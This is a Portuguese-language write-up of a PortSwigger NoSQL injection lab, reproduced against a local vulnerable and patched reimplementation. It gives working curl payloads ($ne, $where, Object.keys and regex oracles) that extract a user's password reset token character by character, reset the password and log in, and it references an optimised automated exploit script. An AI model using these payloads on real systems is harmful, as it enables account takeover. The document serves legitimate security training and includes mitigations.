# Writeup — Exploiting NoSQL operator injection to extract unknown fields

Este documento registra **todos os passos** do desafio de forma reproduzível, com a
**fundamentação** de cada decisão. Ao final há uma seção de **perguntas em aberto** (pontos
que exigem julgamento e que, por transparência, não foram assumidos silenciosamente).

- **Alvo oficial:** https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields
- **Alvo local (reimplementação):** `http://localhost:8080` (vulnerável) e `http://localhost:8081` (corrigido)
- **Objetivo:** logar como `carlos`.
- **Pré-requisito do objetivo:** exfiltrar o *password reset token* de `carlos`.

---

## 0. Setup

```bash
docker compose --profile fixed up --build -d     # mongo + seed + vuln(8080) + fixed(8081)
python3 -m pip install -r exploit/requirements.txt
```

O `seed` cria `wiener` (login normal) e `carlos` com um campo `passwordReset` preenchido,
deixando a conta **locked**. A ordem dos campos do documento é determinística
(`_id`, `username`, `password`, `email`, `passwordReset`) porque o seed usa `bson.D`.

---

## 1. A consulta vulnerável

No código `internal/app/vuln.go`, o corpo JSON é decodificado em `bson.M` e repassado
**integralmente** ao `FindOne`:

```go
var filter bson.M
json.NewDecoder(r.Body).Decode(&filter)     // {"username":..., "password":..., "$where":...}
var user bson.M
s.Users.FindOne(r.Context(), filter).Decode(&user)
```

Como o atacante controla as **chaves** do documento de consulta, pode injetar operadores do
MongoDB (`$ne`, `$where`, `$regex`, ...). É exatamente o padrão descrito pela PortSwigger.

### O oráculo booleano

A aplicação responde de forma diferente conforme a consulta casa ou não:

| Situação | Resposta |
|---|---|
| Sem match | `Invalid username or password` |
| Match, mas conta com token pendente | `Account locked: please reset your password` |

Como `carlos` tem token pendente, **"Account locked" = condição VERDADEIRA** e
**"Invalid username or password" = condição FALSA**.

---

## 2. Passo a passo reproduzível

Todos os comandos abaixo usam `curl`. No lab ao vivo, inclua `-b/-c cookies.txt` para manter a
sessão (o cookie `session` é emitido no primeiro `GET /`).

### Passo 2.1 — Baseline

```bash
curl -s -H 'Content-Type: application/json' \
  -d '{"username":"carlos","password":"invalid"}' http://localhost:8080/login
# -> "Invalid username or password"
```

### Passo 2.2 — Confirmar injeção de `$ne`

```bash
curl -s -H 'Content-Type: application/json' \
  -d '{"username":"carlos","password":{"$ne":"invalid"}}' http://localhost:8080/login
# -> "Account locked: please reset your password"
```

**Fundamentação:** `{"$ne":"invalid"}` vira o operador MongoDB `$ne`. A consulta casa com
`carlos` (senha != "invalid") e, como há token pendente, a resposta é "Account locked".

### Passo 2.3 — Confirmar avaliação de JavaScript (`$where`)

```bash
curl -s -H 'Content-Type: application/json' \
  -d '{"username":"carlos","password":{"$ne":"invalid"},"$where":"0"}' http://localhost:8080/login
# -> "Invalid username or password"

curl -s -H 'Content-Type: application/json' \
  -d '{"username":"carlos","password":{"$ne":"invalid"},"$where":"1"}' http://localhost:8080/login
# -> "Account locked: please reset your password"
```

**Fundamentação:** `$where` avalia uma expressão JavaScript por documento. `"0"` (falsy) elimina o
documento; `"1"` (truthy) mantém. Como as respostas divergem, o JS está sendo executado — logo
podemos usar JavaScript para inspecionar e exfiltrar dados.

### Passo 2.4 — Disparar o "esqueci minha senha" (renova o token local; cria o campo no lab hospedado)

**Diferença importante entre os alvos:** no laboratório hospedado, antes deste passo o documento de
`carlos` tem **4** campos (`_id`, `username`, `password`, `email`); o campo do token só surge após
o reset ser solicitado. Na reimplementação local, o seed já cria `carlos` com `passwordReset` para
manter a conta bloqueada desde o início; este pedido apenas gera e grava um novo token. O passo é
mantido porque corresponde ao fluxo do alvo hospedado e é necessário para a execução contra ele.

```bash
# pega o cookie e o token CSRF da página
curl -s -c cj.txt http://localhost:8080/forgot-password -o fp.html
CSRF=$(grep -oE 'name="csrf" value="[^"]+"' fp.html | cut -d'"' -f4)

# dispara o reset para carlos (grava o token na conta)
curl -s -b cj.txt -c cj.txt -d "csrf=$CSRF&username=carlos" \
  http://localhost:8080/forgot-password
# -> "If the account exists, an email has been sent."
```

No alvo hospedado, verificação de que o campo surgiu (agora há 5 campos):

```bash
curl -s -H 'Content-Type: application/json' \
  -d '{"username":"carlos","password":{"$ne":"invalid"},"$where":"Object.keys(this).length == 5"}' \
  http://localhost:8080/login
# -> "Account locked: please reset your password"
```

### Passo 2.5 — Descobrir os nomes dos campos via `Object.keys`

Payload por caractere/posição:

```
Object.keys(this)[i].match('^.{pos}char.*')
```

Concretamente, para mostrar que `Object.keys(this)[1]` é `username`:

```bash
curl -s -H 'Content-Type: application/json' \
  -d '{"username":"carlos","password":{"$ne":"invalid"},"$where":"Object.keys(this)[1].match('"'"'^.{0}u.*'"'"')"}' \
  http://localhost:8080/login
# -> "Account locked"  (confirma que o 2º campo começa com 'u')
```

O `exploit.py` automatiza isso e enumera:

| índice | campo |
|---|---|
| 0 | `_id` |
| 1 | `username` |
| 2 | `password` |
| 3 | `email` |
| 4 | **`passwordReset`** ← campo desconhecido (o token) |

**Fundamentação:** `Object.keys(this)` lista as chaves do documento; `.match('^.{pos}char.*')`
testa se o caractere na posição `pos` é `char`. Como o resultado é booleano (oráculo), é possível
reconstruir o nome sem que nenhum endpoint o revele.

### Passo 2.6 — Confirmar qual campo é o token

```bash
curl -s "http://localhost:8080/forgot-password?foo=invalid"       # página normal (sem erro)
curl -s "http://localhost:8080/forgot-password?passwordReset=invalid"
# -> "Invalid token"
```

**Fundamentação:** o endpoint só reage ao **nome correto** do campo (retornando `Invalid token`),
sem revelá-lo. É um oráculo de confirmação, não de divulgação.

### Passo 2.7 — Exfiltrar o valor do token

Payload:

```
this['passwordReset'].match('^.{pos}char.*')
```

Exemplo (primeiro caractere):

```bash
curl -s -H 'Content-Type: application/json' \
  -d '{"username":"carlos","password":{"$ne":"invalid"},"$where":"this['"'"'passwordReset'"'"'].match('"'"'^.{0}1.*'"'"')"}' \
  http://localhost:8080/login
# -> "Account locked" se o token começa com '1'
```

O exploit reconstrói o token inteiro (na reimplementação: 16 caracteres hex).

### Passo 2.8 — Usar o token: trocar a senha e logar

```bash
# 1) valida o token -> devolve o formulário de troca de senha (e a sessão)
curl -s -b cj.txt -c cj.txt "http://localhost:8080/forgot-password?passwordReset=<TOKEN>" -o cp.html
CSRF=$(grep -oE 'name="csrf" value="[^"]+"' cp.html | cut -d'"' -f4)

# 2) troca a senha (action vazio => POST na mesma URL com a query)
curl -s -b cj.txt -c cj.txt \
  -d "csrf=$CSRF&passwordReset=<TOKEN>&new-password-1=Pwned1234!&new-password-2=Pwned1234!" \
  "http://localhost:8080/forgot-password?passwordReset=<TOKEN>"

# 3) loga como carlos
curl -s -i -H 'Content-Type: application/json' \
  -d '{"username":"carlos","password":"Pwned1234!"}' http://localhost:8080/login
# -> HTTP/1.1 302 Found, Location: /my-account
```

### Passo 2.9 — Execução automatizada (o caminho recomendado)

```bash
python3 exploit/exploit.py --target http://localhost:8080 --workers 32
```

Saída esperada (resumo):

```
[+] Injecao confirmada: $ne e $where processados pelo MongoDB.
    campos descobertos: ['_id', 'username', 'password', 'email', 'passwordReset']
    campo do token: passwordReset
    token: <16 hex>
[+] SUCESSO: logado como carlos. URL final: http://localhost:8080/my-account
```

---

## 3. Equivalência com o Burp Suite (referência oficial)

| Solução oficial (Burp) | Equivalente usado aqui |
|---|---|
| Repeater para testar `$ne` e `$where` 0/1 | `curl` / método `oracle()` do exploit |
| Intruder (Cluster bomb) com `^.{§§}§§.*` | Busca binária por classe de regex + paralelismo |
| `Object.keys(this)[i]` para nomes de campo | `discover_fields()` |
| `this.YOURTOKENNAME` para o valor | `extract("this['passwordReset']")` |
| "Request in browser > Original session" | `requests.Session` (cookies + CSRF automáticos) |

---

## 4. Otimizações do exploit (e por quê)

O lab oficial responde em ~0,85 s/requisição. A abordagem "um caractere por vez testando o
alfabeto inteiro" gasta `len × |alfabeto|` requisições (centenas) e não termina confortavelmente
dentro da janela do lab. Foram usadas duas otimizações que **preservam o oráculo booleano**:

1. **Busca binária por classe de caracteres.** Em vez de testar `a`, depois `b`, ..., testa-se um
   *conjunto* por requisição: `this.x.match('^.{3}[a-m].*')`. Reduz de `|alfabeto|` para
   `log2(|alfabeto|)` (ex.: 64 → ~6).
2. **Paralelismo por posição.** `^.{pos}char` só restringe a posição `pos`, então as posições são
   independentes e podem ser extraídas concorrentemente. O comprimento é obtido antes com um
   oráculo de comprimento (busca binária em `.length`).

Observação: para classes de regex não precisarem de escape, o alfabeto padrão é restrito a
`[A-Za-z0-9_]` (cobre nomes de campo e tokens hex). Alfabetos customizados com metacaracteres
caem num caminho de teste individual (`_subset_matches`).

---

## 5. Decisões e justificativas

- **`$where` (JavaScript) em vez de só `$regex`:** o nome do campo é desconhecido, então precisamos
  de `Object.keys(this)`. Só o `$where` permite executar JavaScript no servidor; `$regex` sozinho
  exige conhecer o nome do campo. Usamos `$regex`/classe apenas como *predicado* dentro do `$where`.
- **`Object.keys(this)[i]`:** índice 0 é `_id` (o MongoDB grava `_id` primeiro); os demais seguem a
  ordem de inserção, que fixamos no seed com `bson.D` para reprodutibilidade.
- **"Account locked" = presença do token:** modelamos o estado locked como a existência do campo
  `passwordReset`, replicando o lab (a conta fica bloqueada enquanto há reset pendente).
- **Nome do campo fixo (`passwordReset`):** favorece a reprodutibilidade. Ainda assim, **nenhum
  endpoint revela o nome** e o exploit o descobre dinamicamente — a propriedade pedagógica
  ("campo desconhecido") é mantida.
- **Sem hardcode no exploit:** o exploit não conhece nem o nome do campo nem o valor do token.
- **Corrigir com três camadas:** allowlist de chaves + validação de tipos + construção tipada da
  consulta, mais um validador `$jsonSchema` no MongoDB (ver [`PREVENTION.md`](PREVENTION.md)).

---

## 6. Perguntas em aberto (para discussão)

1. **Nome do campo fixo vs. aleatório.** No lab real o nome do campo é imprevisível por instância.
   Aqui ele é fixo para reprodutibilidade e o exploit o descobre. Valeria randomizar o nome via
   variável de ambiente para elevar a fidelidade, ao custo de um setup menos determinístico?
2. **Semântica de "locked".** Assumimos que "locked" ⇔ token presente. É uma inferência sobre a
   implementação interna do lab (não documentada). Um campo `locked` booleano separado seria mais
   explícito, mas menos fiel ao comportamento observado?
3. **`$where` deprecado.** O `$where` está depreciado no MongoDB moderno (segue habilitado por
   padrão). Mantivemos por fidelidade. A mitigação adicional recomendada é desabilitar o
   JavaScript no servidor (`security.javascriptEnabled: false`) — isso não é usado aqui porque
   quebraria a própria vulnerabilidade que queremos demonstrar.
4. **Ordem de `Object.keys`.** Dependemos de `_id` primeiro e da ordem de inserção. Quão estável
   isso é entre versões do MongoDB? (Mitigação: o exploit não assume a ordem, apenas enumera.)
5. **Fronteira de "confirmação de campo".** O `GET /forgot-password?<campo>=invalid` retorna
   `Invalid token` para o nome correto. Isso é um oráculo de confirmação. Concordamos que isso não
   viola a premissa "não inserir endpoint que entregue o nome do campo"?

---

## 7. Problemas encontrados durante a construção (lições)

- **Campo do token só existe após o reset.** A primeira enumeração parou em 4 campos; foi preciso
  disparar o "esqueci minha senha" antes (passo 2.4), como na solução oficial.
- **Parser de formulário.** O lab usa atributos sem aspas (`name=passwordReset`). O parser passou a
  aceitar valores com aspas duplas, simples ou sem aspas.
- **Sobrescrita do token no POST de reset.** Como `passwordReset` contém a substring "password",
  o preenchimento genérico o sobrescrevia; passou-se a preservar explicitamente o campo do token.

---

## 8. Evidências

- Execução contra a **reimplementação vulnerável** (`:8080`): sucesso, logado como `carlos`.
- Execução contra a **versão corrigida** (`:8081`): falha na confirmação da injeção
  (`$ne` não aceito) — ver [`PREVENTION.md`](PREVENTION.md).
- Execução contra o **lab ao vivo**: ver [`LAB_LIVE.md`](LAB_LIVE.md) (banner **Solved**).
